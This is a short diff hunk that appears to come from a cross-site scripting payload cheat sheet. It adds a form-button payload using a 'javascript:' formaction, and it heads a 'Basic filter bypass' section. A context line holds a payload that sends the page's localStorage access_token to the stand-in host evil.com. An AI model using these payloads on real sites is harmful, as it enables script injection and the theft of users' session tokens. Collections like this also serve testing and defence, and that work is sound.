@@ -41,6 +41,10 @@ document.location='//evil.com?t='.concat(localStorage.getItem('access_token'));
 
 - HTML entity list: [Named character references](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references)
 
+```html
+<form><button formaction="javascript:alert(document.domain)">CICK ME</button></form>
+```
+
 ### Basic filter bypass
 
 ```html
